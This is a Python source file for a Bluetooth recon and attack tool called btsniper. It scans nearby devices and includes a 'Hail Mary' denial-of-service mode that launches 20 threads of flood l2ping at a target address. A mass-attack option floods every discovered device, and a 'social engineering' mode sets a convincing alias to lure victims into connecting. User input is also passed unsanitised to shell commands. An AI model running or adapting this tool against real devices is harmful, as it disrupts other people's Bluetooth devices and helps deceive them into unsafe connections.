#!/usr/bin/python

import os
from threading import Thread
import argparse

man_list = {"0x0000":"Ericsson Technology Licensing","0x0001":"Nokia Mobile Phones","0x0002":"Intel Corp.","0x0003":"IBM Corp.","0x0004":"Toshiba Corp.","0x0005":"3Com","0x0006":"Microsoft","0x0007":"Lucent","0x0008":"Motorola","0x0009":"Infineon Technologies AG","0x000A":"Cambridge Silicon Radio","0x000B":"Silicon Wave","0x000C":"Digianswer A/S","0x000D":"Texas Instruments Inc.","0x000E":"Ceva, Inc. (formerly Parthus Technologies, Inc.)","0x000F":"Broadcom Corporation","0x0010":"Mitel Semiconductor","0x0011":"Widcomm, Inc","0x0012":"Zeevo, Inc.","0x0013":"Atmel Corporation","0x0014":"Mitsubishi Electric Corporation","0x0015":"RTX Telecom A/S","0x0016":"KC Technology Inc.","0x0017":"NewLogic","0x0018":"Transilica, Inc.","0x0019":"Rohde & Schwarz GmbH & Co. KG","0x001A":"TTPCom Limited","0x001B":"Signia Technologies, Inc.","0x001C":"Conexant Systems Inc.","0x001D":"Qualcomm","0x001E":"Inventel","0x001F":"AVM Berlin","0x0020":"BandSpeed, Inc.","0x0021":"Mansella Ltd","0x0022":"NEC Corporation","0x0023":"WavePlus Technology Co., Ltd.","0x0024":"Alcatel","0x0025":"NXP Semiconductors (formerly Philips Semiconductors)","0x0026":"C Technologies","0x0027":"Open Interface","0x0028":"R F Micro Devices","0x0029":"Hitachi Ltd","0x002A":"Symbol Technologies, Inc.","0x002B":"Tenovis","0x002C":"Macronix International Co. Ltd.","0x002D":"GCT Semiconductor","0x002E":"Norwood Systems","0x002F":"MewTel Technology Inc.","0x0030":"ST Microelectronics","0x0031":"Synopsis","0x0032":"Red-M (Communications) Ltd","0x0033":"Commil Ltd","0x0034":"Computer Access Technology Corporation (CATC)","0x0035":"Eclipse (HQ Espana) S.L.","0x0036":"Renesas Electronics Corporation","0x0037":"Mobilian Corporation","0x0038":"Terax","0x0039":"Integrated System Solution Corp.","0x003A":"Matsushita Electric Industrial Co., Ltd.","0x003B":"Gennum Corporation","0x003C":"BlackBerry Limited (formerly Research In Motion)","0x003D":"IPextreme, Inc.","0x003E":"Systems and Chips, Inc.","0x003F":"Bluetooth SIG, Inc.","0x0040":"Seiko Epson Corporation","0x0041":"Integrated Silicon Solution Taiwan, Inc.","0x0042":"CONWISE Technology Corporation Ltd","0x0043":"PARROT SA","0x0044":"Socket Mobile","0x0045":"Atheros Communications, Inc.","0x0046":"MediaTek, Inc.","0x0047":"Bluegiga","0x0048":"Marvell Technology Group Ltd.","0x0049":"3DSP Corporation","0x004A":"Accel Semiconductor Ltd.","0x004B":"Continental Automotive Systems","0x004C":"Apple, Inc.","0x004D":"Staccato Communications, Inc.","0x004E":"Avago Technologies","0x004F":"APT Licensing Ltd.","0x0050":"SiRF Technology","0x0051":"Tzero Technologies, Inc.","0x0052":"J&M Corporation","0x0053":"Free2move AB","0x0054":"3DiJoy Corporation","0x0055":"Plantronics, Inc.","0x0056":"Sony Ericsson Mobile Communications","0x0057":"Harman International Industries, Inc.","0x0058":"Vizio, Inc.","0x0059":"Nordic Semiconductor ASA","0x005A":"EM Microelectronic-Marin SA","0x005B":"Ralink Technology Corporation","0x005C":"Belkin International, Inc.","0x005D":"Realtek Semiconductor Corporation","0x005E":"Stonestreet One, LLC","0x005F":"Wicentric, Inc.","0x0060":"RivieraWaves S.A.S","0x0061":"RDA Microelectronics","0x0062":"Gibson Guitars","0x0063":"MiCommand Inc.","0x0064":"Band XI International, LLC","0x0065":"Hewlett-Packard Company","0x0066":"9Solutions Oy","0x0067":"GN Netcom A/S","0x0068":"General Motors","0x0069":"A&D Engineering, Inc.","0x006A":"MindTree Ltd.","0x006B":"Polar Electro OY","0x006C":"Beautiful Enterprise Co., Ltd.","0x006D":"BriarTek, Inc.","0x006E":"Summit Data Communications, Inc.","0x006F":"Sound ID","0x0070":"Monster, LLC","0x0071":"connectBlue AB","0x0072":"ShangHai Super Smart Electronics Co. Ltd.","0x0073":"Group Sense Ltd.","0x0074":"Zomm, LLC","0x0075":"Samsung Electronics Co. Ltd.","0x0076":"Creative Technology Ltd.","0x0077":"Laird Technologies","0x0078":"Nike, Inc.","0x0079":"lesswire AG","0x007A":"MStar Semiconductor, Inc.","0x007B":"Hanlynn Technologies","0x007C":"A & R Cambridge","0x007D":"Seers Technology Co. Ltd","0x007E":"Sports Tracking Technologies Ltd.","0x007F":"Autonet Mobile","0x0080":"DeLorme Publishing Company, Inc.","0x0081":"WuXi Vimicro","0x0082":"Sennheiser Communications A/S","0x0083":"TimeKeeping Systems, Inc.","0x0084":"Ludus Helsinki Ltd.","0x0085":"BlueRadios, Inc.","0x0086":"equinox AG","0x0087":"Garmin International, Inc.","0x0088":"Ecotest","0x0089":"GN ReSound A/S","0x008A":"Jawbone","0x008B":"Topcorn Positioning Systems, LLC","0x008C":"Gimbal Inc. (formerly Qualcomm Labs, Inc. and Qualcomm Retail Solutions, Inc.)","0x008D":"Zscan Software","0x008E":"Quintic Corp.","0x008F":"Stollman E+V GmbH","0x0090":"Funai Electric Co., Ltd.","0x0091":"Advanced PANMOBIL Systems GmbH & Co. KG","0x0092":"ThinkOptics, Inc.","0x0093":"Universal Electronics, Inc.","0x0094":"Airoha Technology Corp.","0x0095":"NEC Lighting, Ltd.","0x0096":"ODM Technology, Inc.","0x0097":"ConnecteDevice Ltd.","0x0098":"zer01.tv GmbH","0x0099":"i.Tech Dynamic Global Distribution Ltd.","0x009A":"Alpwise","0x009B":"Jiangsu Toppower Automotive Electronics Co., Ltd.","0x009C":"Colorfy, Inc.","0x009D":"Geoforce Inc.","0x009E":"Bose Corporation","0x009F":"Suunto Oy","0x00A0":"Kensington Computer Products Group","0x00A1":"SR-Medizinelektronik","0x00A2":"Vertu Corporation Limited","0x00A3":"Meta Watch Ltd.","0x00A4":"LINAK A/S","0x00A5":"OTL Dynamics LLC","0x00A6":"Panda Ocean Inc.","0x00A7":"Visteon Corporation","0x00A8":"ARP Devices Limited","0x00A9":"Magneti Marelli S.p.A","0x00AA":"CAEN RFID srl","0x00AB":"Ingenieur-Systemgruppe Zahn GmbH","0x00AC":"Green Throttle Games","0x00AD":"Peter Systemtechnik GmbH","0x00AE":"Omegawave Oy","0x00AF":"Cinetix","0x00B0":"Passif Semiconductor Corp","0x00B1":"Saris Cycling Group, Inc","0x00B2":"Bekey A/S","0x00B3":"Clarinox Technologies Pty. Ltd.","0x00B4":"BDE Technology Co., Ltd.","0x00B5":"Swirl Networks","0x00B6":"Meso international","0x00B7":"TreLab Ltd","0x00B8":"Qualcomm Innovation Center, Inc. (QuIC)","0x00B9":"Johnson Controls, Inc.","0x00BA":"Starkey Laboratories Inc.","0x00BB":"S-Power Electronics Limited","0x00BC":"Ace Sensor Inc","0x00BD":"Aplix Corporation","0x00BE":"AAMP of America","0x00BF":"Stalmart Technology Limited","0x00C0":"AMICCOM Electronics Corporation","0x00C1":"Shenzhen Excelsecu Data Technology Co.,Ltd","0x00C2":"Geneq Inc.","0x00C3":"adidas AG","0x00C4":"LG Electronics","0x00C5":"Onset Computer Corporation","0x00C6":"Selfly BV","0x00C7":"Quuppa Oy.","0x00C8":"GeLo Inc","0x00C9":"Evluma","0x00CA":"MC10","0x00CB":"Binauric SE","0x00CC":"Beats Electronics","0x00CD":"Microchip Technology Inc.","0x00CE":"Elgato Systems GmbH","0x00CF":"ARCHOS SA","0x00D0":"Dexcom, Inc.","0x00D1":"Polar Electro Europe B.V.","0x00D2":"Dialog Semiconductor B.V.","0x00D3":"Taixingbang Technology (HK) Co,. LTD.","0x00D4":"Kawantech","0x00D5":"Austco Communication Systems","0x00D6":"Timex Group USA, Inc.","0x00D7":"Qualcomm Technologies, Inc.","0x00D8":"Qualcomm Connected Experiences, Inc.","0x00D9":"Voyetra Turtle Beach","0x00DA":"txtr GmbH","0x00DB":"Biosentronics","0x00DC":"Procter & Gamble","0x00DD":"Hosiden Corporation","0x00DE":"Muzik LLC","0x00DF":"Misfit Wearables Corp","0x00E0":"Google","0x00E1":"Danlers Ltd","0x00E2":"Semilink Inc","0x00E3":"inMusic Brands, Inc","0x00E4":"L.S. Research Inc.","0x00E5":"Eden Software Consultants Ltd.","0x00E6":"Freshtemp","0x00E7":"KS Technologies","0x00E8":"ACTS Technologies","0x00E9":"Vtrack Systems","0x00EA":"Nielsen-Kellerman Company","0x00EB":"Server Technology, Inc.","0x00EC":"BioResearch Associates","0x00ED":"Jolly Logic, LLC","0x00EE":"Above Average Outcomes, Inc.","0x00EF":"Bitsplitters GmbH","0x00F0":"PayPal, Inc.","0x00F1":"Witron Technology Limited","0x00F2":"Aether Things Inc. (formerly Morse Project Inc.)","0x00F3":"Kent Displays Inc.","0x00F4":"Nautilus Inc.","0x00F5":"Smartifier Oy","0x00F6":"Elcometer Limited","0x00F7":"VSN Technologies Inc.","0x00F8":"AceUni Corp., Ltd.","0x00F9":"StickNFind","0x00FA":"Crystal Code AB","0x00FB":"KOUKAAM a.s.","0x00FC":"Delphi Corporation","0x00FD":"ValenceTech Limited","0x00FE":"Reserved","0x00FF":"Typo Products, LLC","0x0100":"TomTom International BV","0x0101":"Fugoo, Inc","0x0102":"Keiser Corporation","0x0103":"Bang & Olufsen A/S","0x0104":"PLUS Locations Systems Pty Ltd","0x0105":"Ubiquitous Computing Technology Corporation","0x0106":"Innovative Yachtter Solutions","0x0107":"William Demant Holding A/S","0x0108":"Chicony Electronics Co., Ltd.","0x0109":"Atus BV","0x010A":"Codegate Ltd.","0x010B":"ERi, Inc.","0x010C":"Transducers Direct, LLC","0x010D":"Fujitsu Ten Limited","0x010E":"Audi AG","0x010F":"HiSilicon Technologies Co., Ltd.","0x0110":"Nippon Seiki Co., Ltd.","0x0111":"Steelseries ApS","0x0112":"vyzybl Inc.","0x0113":"Openbrain Technologies, Co., Ltd.","0x0114":"Xensr","0x0115":"e.solutions","0x0116":"1OAK Technologies","0x0117":"Wimoto Technologies Inc","0x0118":"Radius Networks, Inc.","0x0119":"Wize Technology Co., Ltd.","0x011A":"Qualcomm Labs, Inc.","0x011B":"Aruba Networks","0x011C":"Baidu","0x011D":"Arendi AG","0x011E":"Skoda Auto a.s.","0x011F":"Volkswagon AG","0x0120":"Porsche AG","0x0121":"Sino Wealth Electronic Ltd.","0x0122":"AirTurn, Inc.","0x0123":"Kinsa, Inc.","0x0124":"HID Global","0x0125":"SEAT es","0x0126":"Promethean Ltd.","0x0127":"Salutica Allied Solutions","0x0128":"GPSI Group Pty Ltd","0x0129":"Nimble Devices Oy","0x012A":"Changzhou Yongse Infotech Co., Ltd","0x012B":"SportIQ","0x012C":"TEMEC Instruments B.V.","0x012D":"Sony Corporation","0x012E":"ASSA ABLOY","0x012F":"Clarion Co., Ltd.","0x0130":"Warehouse Innovations","0x0131":"Cypress Semiconductor Corporation","0x0132":"MADS Inc","0x0133":"Blue Maestro Limited","0x0134":"Resolution Products, Inc.","0x0135":"Airewear LLC","0x0136":"Seed Labs, Inc. (formerly ETC sp. z.o.o.)","0x0137":"Prestigio Plaza Ltd.","0x0138":"NTEO Inc.","0x0139":"Focus Systems Corporation","0x013A":"Tencent Holdings Limited","0x013B":"Allegion","0x013C":"Murata Manufacuring Co., Ltd.","0x013E":"Nod, Inc.","0x013F":"B&B Manufacturing Company","0x0140":"Alpine Electronics (China) Co., Ltd","0x0141":"FedEx Services","0x0142":"Grape Systems Inc.","0x0143":"Bkon Connect","0x0144":"Lintech GmbH","0x0145":"Novatel Wireless","0x0146":"Ciright","0x0147":"Mighty Cast, Inc.","0x0148":"Ambimat Electronics","0x0149":"Perytons Ltd.","0x014A":"Tivoli Audio, LLC","0x014B":"Master Lock","0x014C":"Mesh-Net Ltd","0x014D":"Huizhou Desay SV Automotive CO., LTD.","0x014E":"Tangerine, Inc.","0x014F":"B&W Group Ltd.","0x0150":"Pioneer Corporation","0x0151":"OnBeep","0x0152":"Vernier Software & Technology","0x0153":"ROL Ergo","0x0154":"Pebble Technology","0x0155":"NETATMO","0x0156":"Accumulate AB","0x0157":"Anhui Huami Information Technology Co., Ltd.","0x0158":"Inmite s.r.o.","0x0159":"ChefSteps, Inc.","0x015A":"micas AG","0x015B":"Biomedical Research Ltd.","0x015C":"Pitius Tec S.L.","0x015D":"Estimote, Inc.","0x015E":"Unikey Technologies, Inc.","0x015F":"Timer Cap Co.","0x0160":"AwoX","0x0161":"yikes","0x0162":"MADSGlobal NZ Ltd.","0x0163":"PCH International","0x0164":"Qingdao Yeelink Information Technology Co., Ltd.","0x0165":"Milwaukee Tool (formerly Milwaukee Electric Tools)","0x0166":"MISHIK Pte Ltd","0x0167":"Bayer HealthCare","0x0168":"Spicebox LLC","0x0169":"emberlight","0x016A":"Cooper-Atkins Corporation","0x016B":"Qblinks","0x016C":"MYSPHERA","0x016D":"LifeScan Inc","0x016E":"Volantic AB","0x016F":"Podo Labs, Inc","0x0170":"Roche Diabetes Care AG","0x0171":"Amazon Fulfillment Service","0x0172":"Connovate Technology Private Limited","0x0173":"Kocomojo, LLC","0x0174":"Everykey LLC","0x0175":"Dynamic Controls","0x0176":"SentriLock","0x0177":"I-SYST inc.","0x0178":"CASIO COMPUTER CO., LTD.","0x0179":"LAPIS Semiconductor Co., Ltd.","0x017A":"Telemonitor, Inc.","0x017B":"taskit GmbH","0x017C":"Daimler AG","0x017D":"BatAndCat","0x017E":"BluDotz Ltd","0x017F":"XTel ApS","0x0180":"Gigaset Communications GmbH","0x0181":"Gecko Health Innovations, Inc.","0x0182":"HOP Ubiquitous","0x0183":"To Be Assigned","0x0184":"Nectar","0x0185":"bel’apps LLC","0x0186":"CORE Lighting Ltd","0x0187":"Seraphim Sense Ltd","0x0188":"Unico RBC","0x0189":"Physical Enterprises Inc.","0x018A":"Able Trend Technology Limited","0x018B":"Konica Minolta, Inc.","0x018C":"Wilo SE","0x018D":"Extron Design Services","0x018E":"Fitbit, Inc.","0x018F":"Fireflies Systems","0x0190":"Intelletto Technologies Inc.","0x0191":"FDK CORPORATION","0x0192":"Cloudleaf, Inc","0x0193":"Maveric Automation LLC","0x0194":"Acoustic Stream Corporation","0x0195":"Zuli","0x0196":"Paxton Access Ltd","0x0197":"WiSilica Inc","0x0198":"Vengit Limited","0x0199":"SALTO SYSTEMS S.L.","0x019A":"TRON Forum (formerly T-Engine Forum)","0x019B":"CUBETECH s.r.o.","0x019C":"Cokiya Incorporated","0x019D":"CVS Health","0x019E":"Ceruus","0x019F":"Strainstall Ltd","0x01A0":"Channel Enterprises (HK) Ltd.","0x01A1":"FIAMM","0x01A2":"GIGALANE.CO.,LTD","0x01A3":"EROAD","0x01A4":"Mine Safety Appliances","0x01A5":"Icon Health and Fitness","0x01A6":"Asandoo GmbH","0x01A7":"ENERGOUS CORPORATION","0x01A8":"Taobao","0x01A9":"Canon Inc.","0x01AA":"Geophysical Technology Inc.","0x01AB":"Facebook, Inc.","0x01AC":"Nipro Diagnostics, Inc.","0x01AD":"FlightSafety International","0x01AE":"Earlens Corporation","0x01AF":"Sunrise Micro Devices, Inc.","0x01B0":"Star Micronics Co., Ltd.","0x01B1":"Netizens Sp. z o.o.","0x01B2":"Nymi Inc.","0x01B3":"Nytec, Inc.","0x01B4":"Trineo Sp. z o.o.","0x01B5":"Nest Labs Inc.","0x01B6":"LM Technologies Ltd","0x01B7":"General Electric Company","0x01B8":"i+D3 S.L.","0x01B9":"HANA Micron","0x01BA":"Stages Cycling LLC","0x01BB":"Cochlear Bone Anchored Solutions AB","0x01BC":"SenionLab AB","0x01BD":"Syszone Co., Ltd","0x01BE":"Pulsate Mobile Ltd.","0x01BF":"Hong Kong HunterSun Electronic Limited","0x01C0":"pironex GmbH","0x01C1":"BRADATECH Corp.","0x01C2":"Transenergooil AG","0x01C3":"Bunch","0x01C4":"DME Microelectronics","0x01C5":"Bitcraze AB","0x01C6":"HASWARE Inc.","0x01C7":"Abiogenix Inc.","0x01C8":"Poly-Control ApS","0x01C9":"Avi-on","0x01CA":"Laerdal Medical AS","0x01CB":"Fetch My Pet","0x01CC":"Sam Labs Ltd.","0x01CD":"Chengdu Synwing Technology Ltd","0x01CE":"HOUWA SYSTEM DESIGN, k.k.","0x01CF":"BSH","0x01D0":"Primus Inter Pares Ltd","0x01D1":"August","0x01D2":"Gill Electronics","0x01D3":"Sky Wave Design","0x01D4":"Newlab S.r.l.","0x01D5":"ELAD srl","0x01D6":"G-wearables inc.","0x01D7":"Squadrone Systems Inc.","0x01D8":"Code Corporation","0x01D9":"Savant Systems LLC","0x01DA":"Logitech International SA","0x01DB":"Innblue Consulting","0x01DC":"iParking Ltd.","0x01DD":"Koninklijke Philips Electronics N.V.","0x01DE":"Minelab Electronics Pty Limited","0x01DF":"Bison Group Ltd.","0x01E0":"Widex A/S","0x01E1":"Jolla Ltd","0x01E2":"Lectronix, Inc.","0x01E3":"Caterpillar Inc","0x01E4":"Freedom Innovations","0x01E5":"Dynamic Devices Ltd","0x01E6":"Technology Solutions (UK) Ltd","0x01E7":"IPS Group Inc.","0x01E8":"STIR","0x01E9":"Sano, Inc","0x01EA":"Advanced Application Design, Inc.","0x01EB":"AutoMap LLC","0x01EC":"Spreadtrum Communications Shanghai Ltd","0x01ED":"CuteCircuit LTD","0x01EE":"Valeo Service","0x01EF":"Fullpower Technologies, Inc.","0x01F0":"KloudNation","0x01F1":"Zebra Technologies Corporation","0x01F2":"Itron, Inc.","0x01F3":"The University of Tokyo","0x01F4":"UTC Fire and Security","0x01F5":"Cool Webthings Limited","0x01F6":"DJO Global","0x01F7":"Gelliner Limited","0x01F8":"Anyka (Guangzhou) Microelectronics Technology Co, LTD","0x01F9":"Medtronic, Inc.","0x01FA":"Gozio, Inc.","0x01FB":"Form Lifting, LLC","0x01FC":"Wahoo Fitness, LLC","0x01FD":"Kontakt Micro-Location Sp. z o.o.","0x01FE":"Radio System Corporation","0x01FF":"Freescale Semiconductor, Inc.","0x0200":"Verifone Systems PTe Ltd. Taiwan Branch","0x0201":"AR Timing","0x0202":"Rigado LLC","0x0203":"Kemppi Oy","0x0204":"Tapcentive Inc.","0x0205":"Smartbotics Inc.","0x0206":"Otter Products, LLC","0x0207":"STEMP Inc.","0x0208":"LumiGeek LLC","0x0209":"InvisionHeart Inc.","0x020A":"Macnica Inc. ","0x020B":"Jaguar Land Rover Limited","0x020C":"CoroWare Technologies, Inc","0x020D":"Simplo Technology Co., LTD","0x020E":"Omron Healthcare Co., LTD","0x020F":"Comodule GMBH","0x0210":"ikeGPS","0x0211":"Telink Semiconductor Co. Ltd","0x0212":"Interplan Co., Ltd","0x0213":"Wyler AG","0x0214":"IK Multimedia Production srl","0x0215":"Lukoton Experience Oy","0x0216":"MTI Ltd","0x0217":"Tech4home, Lda","0x0216":"Hiotech AB"}

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def l2ping(btaddr):
    os.system("sudo l2ping -s 600 -f -c 100 "+btaddr)

def hcitool(btaddr):
    os.system("sudo hcitool cc --role=m "+btaddr)
    os.system("sudo hcitool auth "+btaddr)

def snipe(btaddr):
    threadj = Thread(target = l2ping, args=(btaddr,))
    threadj.start()
#    threadj2 = Thread(target = hcitool, args=(btaddr,))
#    threadj2.start()

def DOS(btaddr):
    for i in range(20):
        thread = Thread(target = snipe, args=(btaddr,))
        thread.start()

def attack():
    pass

def ping_():
	print("BtAddr?")
	inp = input(bcolors.FAIL+bcolors.UNDERLINE+"Ping>"+bcolors.ENDC+bcolors.WARNING)
	print(bcolors.HEADER+"Pinging "+str(inp)+bcolors.WARNING)
	os.system("sudo l2ping -s 10 -v -c 1 "+inp)

def attk(targets):
    btaddrs = []
    print("Chooose Targets (1,2,3 | 4 | all)")
    inp = input(bcolors.FAIL+bcolors.UNDERLINE+"INQRecon (attk)>"+bcolors.ENDC+bcolors.WARNING)
    if ',' in inp:
        pass
    elif 'all' in inp:
        btaddrs = targets
        print("ARE YOU SURE YOU WANT TO ATTACK "+str(btaddrs))
        inp = input(bcolors.FAIL+bcolors.UNDERLINE+"INQRecon (attk)>"+bcolors.ENDC+bcolors.WARNING)
        for i in range(len(btaddrs)):
            thr = Thread(target=l2ping, args=(btaddrs[i],))
            thr.start()

def soceng():
    print("Welcome to the BTSniper Social Engineering Suite!")
    while True:
        print("""1) Setup
2) Status
3) Connect
4) List of Pwned Devices
5) Exit""")
        inp = input(bcolors.FAIL+bcolors.UNDERLINE+"SOCeng>"+bcolors.ENDC+bcolors.WARNING)

        if inp == "1":
            print("Alias (set this to something convicing that people might trust)")
            inp = input(bcolors.FAIL+bcolors.UNDERLINE+"SOCeng Setup>"+bcolors.ENDC+bcolors.WARNING)
            os.system("bluetoothctl -- system-alias \""+inp+"\"")
            print("Setting discovery status")
            os.system("bluetoothctl -- discoverable on")
        elif inp == "3":
            print("BtAddr?")
            inp = input(bcolors.FAIL+bcolors.UNDERLINE+"SOCeng Connect>"+bcolors.ENDC+bcolors.WARNING)
            print("Connecting to "+inp)
            os.system("bluetoothctl -- remove "+inp)
            os.system("sudo l2ping -s 10 -v -c 1 "+inp)
#            os.system("bluetoothctl -- trust "+inp)
            os.system("bt-device -c "+inp)
        elif inp == "5":
            break

def inqrecon():
    c = False
    targets = []
    while True:
        if c != True:
            print(bcolors.HEADER+"Running Command"+bcolors.WARNING)
            cmdoutput = os.popen('sudo hcitool inq').read().split('\n')

            cmdoutput = cmdoutput[::-1][:-1]

            for i in range(len(cmdoutput)):
                try:cmdoutput[i] = cmdoutput[i].split('\t')[1]
                except:continue
                print(bcolors.WARNING+"Performing hcitool check on host "+cmdoutput[i])
                devinf = os.popen('sudo hcitool info '+cmdoutput[i]).read().split('\n')
                try:
                    devname = devinf[3]
                    devcompany = devinf[2]
                    devman = devinf[5]
                except:
                    print(bcolors.FAIL+"Failed HCItool check, skipping")
                    print()
                    continue
                if 'Device' in "".join(devinf):print(bcolors.OKGREEN+"Done!"+bcolors.WARNING)
                else:
                    print(bcolors.FAIL+"Failed HCItool check, skipping")
                    print()
                    continue
                print(bcolors.OKBLUE+"Info for host "+cmdoutput[i]+":")
                print("""Device Name: """+devname+"""
Device Brand: """+devcompany+"""
Device Manufacturer: """+devman+bcolors.WARNING)

                print("Performing l2ping check on host "+cmdoutput[i])
                l2pingout = os.popen('sudo l2ping -s 10 -v -c1 '+cmdoutput[i]).read()
                # print(l2pingout)
                if 'Ping' in l2pingout:
                    print(bcolors.OKGREEN+"Done! All checks passed adding to target list"+bcolors.WARNING)
                    print()
                else:
                    print(bcolors.FAIL+"Failed l2ping check, skipping")
                    print()
                    continue
                if cmdoutput[i] not in targets:
                    targets.append(cmdoutput[i])

        # print(targets)

        inp = input(bcolors.FAIL+bcolors.UNDERLINE+"INQRecon>"+bcolors.ENDC+bcolors.WARNING)

        if inp == 'help':
            print("""Help:
help    - Brings up this help screen
attk    - Attack 1 or more targets
rcon    - Gets info on specified target
targets - Prints targets
q	- Exit INQRecon""")
            c = True
            continue
        elif inp == 'attk':
            attk(targets)
            c = False
            break
        elif inp == 'rcon':
            print("BtAddr?")
            inp = input(bcolors.FAIL+bcolors.UNDERLINE+"INQRecon rcon>"+bcolors.ENDC+bcolors.WARNING)

            os.system("sudo hcitool info "+inp)
            c = True
        elif inp == 'targets':
            print("Current Targets: "+str(targets))
        elif inp == 'q':
            break
        else:
            c = False

def recon(args):
    os.system("clear")
    os.system("sudo hciconfig hci0 reset")
    print("Welcome To btsniper v1.0")
    print()
    print("""\033[1m\033[96m____________________\033[95m__________      .__                     
\033[96m\______   \__    ___\033[95m/   _____/ ____ |__|_____   ___________ 
 \033[96m|    |  _/ |    |  \033[95m\_____  \ /    \|  \____ \_/ __ \_  __ \\
 \033[96m|    |   \ |    |  \033[95m/        \   |  \  |  |_> >  ___/|  | \/
 \033[96m|______  / |____| \033[95m/_______  /___|  /__|   __/ \___  >__|   
 \033[96m       \/          \033[95m       \/     \/   |__|        \/       """)
    print("""  (                           \033[0m\033[1m      _
\033[96m   )                               \033[0m\033[1m/=>
\033[96m  (  +\033[0m\033[1m____________________\033[0m/\/\___ / /|
\033[96m   .''.\033[0m\033[1m_____________'._____      / /|/\\
\033[96m  : () :\033[0m\033[1m              :\ ----\|    \ )
\033[96m   '..'\033[0m\033[1m______________.'0|----|      \\
                    0_0/____/        \\
                        |----    /----\\
                       || -\\\\ --|      \\
                       ||   || ||\      \\
                        \\\\____// '|      \\
                                .'/       |
                               .:/        |
                               :/_________|
                                           \033[0m""")
    while True:
        print(bcolors.OKGREEN+bcolors.BOLD+"""What would you like to do?
1) """+bcolors.OKCYAN+"""INQRecon     - Performs hcitool inq and test pings each response, if successful ping, add to list
"""+bcolors.OKGREEN+"""2) """+bcolors.OKCYAN+"""Ping	- Pings a host to see if they are targetable by ping attack
"""+bcolors.OKGREEN+"""3) """+bcolors.OKCYAN+"""SOCeng	- Connection social engineering tool
"""+bcolors.OKGREEN+"""4) """+bcolors.OKCYAN+"""
"""+bcolors.OKGREEN+"""5) """+bcolors.OKCYAN+"""Hail Mary    - I wonder what this does?""")
        inp = input(bcolors.FAIL+bcolors.UNDERLINE+">"+bcolors.ENDC+bcolors.WARNING)
        os.system("clear")

        if inp == "1":
            inqrecon()
        elif inp == "2":
            ping_()
        elif inp == "3":
            soceng()
        elif inp == "5":
            print("OH GOD WHAT HAVE YOU DONE!")
            print("BtAddr?")
            DOS(input(bcolors.FAIL+bcolors.UNDERLINE+"Hail Mary>"+bcolors.ENDC+bcolors.WARNING))

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Bluetooth recon/pwning tool')
    parser.add_argument('-m', '--mode', help='Set the mode [a, r]')
    parser.add_argument('-t', '--target', help='Set the target bluetooth address')
    args = parser.parse_args()
    
    if args.mode == "r":
        recon(args)
    if args.mode == "a":
        attack(args)
